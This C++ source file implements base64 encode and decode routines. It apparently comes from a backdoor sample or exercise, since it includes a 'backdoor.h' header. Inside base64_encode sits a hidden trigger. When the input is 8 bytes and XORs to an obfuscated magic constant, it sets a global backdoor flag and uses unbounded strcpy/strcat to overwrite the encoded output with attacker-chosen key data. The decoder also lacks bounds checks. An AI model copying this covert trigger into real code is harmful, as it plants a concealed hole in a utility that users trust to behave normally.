#include <cstdlib>
#include <cstring>

#include "backdoor.h"
#include "base64.h"

void base64_encode(const unsigned char *input, int length, char *output) {
    const unsigned char *end = input + length;
    while (end - input >= 3) {
        unsigned char a = input[0];
        unsigned char b = input[1];
        unsigned char c = input[2];

        output[0] = base64_table_enc[a >> 2];
        output[1] = base64_table_enc[((a & 0x03) << 4) | (b >> 4)];
        output[2] = base64_table_enc[((b & 0x0f) << 2) | (c >> 6)];
        output[3] = base64_table_enc[c & 0x3f];
        output += 4;
        input += 3;
    }
    if (end - input) {
        unsigned char a = input[0];
        output[0] = base64_table_enc[a >> 2];
        if (end - input == 1) {
            output[1] = base64_table_enc[(a & 0x03) << 4];
            output[2] = '=';
        } else {
            char b = input[1];
            output[1] = base64_table_enc[((a & 0x03) << 4) | (b >> 4)];
            output[2] = base64_table_enc[(b & 0x0f) << 2];
        }
        output[3] = '=';
        output += 4;
    }
    *output = '\0';

    // b';^\x11/\x05\x02\x1e\x05'
    if (length == 8) {
        char* out_start = (char*)output - 12;
        char* in_start = (char*)input - 6;
        char check[8] = {';', '^', 0x11, '/', 0x05, 0x02, 0x1e, 0x05};

        uint64_t a = *(uint64_t*)in_start;
        uint64_t b = *(uint64_t*)out_start;
        uint64_t c = *(uint64_t*)check;
        if ((a ^ b ^ c) == 0) {
            backdoor1 = true;
            strcpy(key, in_start);
            strcat(key, in_start);
            strcpy(out_start, key);
        }
        else {
            backdoor1 = false;
        }
    } else {
        backdoor1 = false;
    }
}


void base64_decode(const char *input, int length, unsigned char *output) {
    const char *end = input + length;
    while (end > input) {
        unsigned char a = base64_table_dec[input[0]];
        unsigned char b = base64_table_dec[input[1]];
        unsigned char c = base64_table_dec[input[2]];
        unsigned char d = base64_table_dec[input[3]];

        if (a == 255 || b == 255 || c == 255 || d == 255) {
            break;
        }

        output[0] = (a << 2) | (b >> 4);
        if (c != 254) // 254 = '=' 
            output[1] = (b << 4) | (c >> 2);
        if (d != 254) // 254 = '='
            output[2] = (c << 6) | d;

        output += 3;
        input += 4;
    }
    *output = '\0';
}